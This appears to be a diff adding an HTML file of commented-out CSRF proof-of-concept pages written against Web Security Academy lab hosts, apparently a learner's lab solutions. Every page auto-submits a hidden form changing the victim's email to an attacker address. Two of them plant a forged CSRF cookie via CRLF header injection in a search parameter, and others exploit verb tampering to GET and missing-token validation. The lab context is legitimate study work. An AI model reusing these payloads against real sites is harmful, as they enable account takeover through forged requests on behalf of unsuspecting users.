@@ -1,0 +1,69 @@
+<!-- Double submit CSRF token. For some reason the forgery below works on Chromium, but it does not work on Firefox
+<html>
+    <body>
+        <form action="https://0a1c002e03bce87584e79f5100f200f9.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil.net" />
+            <input type="hidden" name="csrf" value="fake" />
+            <script> /* The CSRF token above is invented */ </script>
+        </form>
+        <img src="https://0a1c002e03bce87584e79f5100f200f9.web-security-academy.net/?search=a%0D%0ASet-Cookie%3A+csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
+        <script> /* The csrf cookie above has to match the token, it is injected because the website has a vulnerability in the search function */ </script>
+    </body>
+</html>
+-->
+
+<!-- CSRF token tied to non-session cookie
+<html>
+    <body>
+        <form action="https://0aa70031048edb428698df5300bd00b6.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="ccc@evil.net" />
+            <input type="hidden" name="csrf" value="p81xA0G8s8F5iihCEr9npEmWrP0hI9kp" />
+            <script> /* The CSRF token above is from the attacker's account */ </script>
+        </form>
+        <img src="https://0aa70031048edb428698df5300bd00b6.web-security-academy.net/?search=a%0D%0ASet-Cookie%3A+csrfKey%3Dzfv9wXTIisLdNydCuDk378NrHkQLNuZb%3b%20SameSite=None" onerror="document.forms[0].submit()">
+        <script> /* The csrfKey cookie above is from the attacker's account, and the website has a vulnerability in the search function which injects cookies */ </script>
+    </body>
+</html>
+-->
+
+<!-- CSRF token not tied to user session
+<html>
+    <body>
+        <form action="https://0a75008704cab856813d6b6700e100a4.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil.net" />
+            <input type="hidden" name="csrf" value="P0EbtVvn48kHAfiKH1w8QAKFEijMqI8V" />
+            <script> /* The CSRF token above is from the attacker's account */ </script>
+            <script> /* (Nested HTML comments are not allowed) */ </script>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+-->
+
+<!-- HTTP verb tampering, changing request method to GET
+<html>
+    <body>
+        <form action="https://0a00003a04e4c36081602036004e001d.web-security-academy.net/my-account/change-email?email=pwned@evil.net" method="GET">
+            <input type="hidden" name="email" value="something@evil.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+-->
+
+<!-- No protection / Validation when CSRF token is not present
+<html>
+    <body>
+        <form action="https://0a1700c0045cd87a8046303f00df005b.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+-->
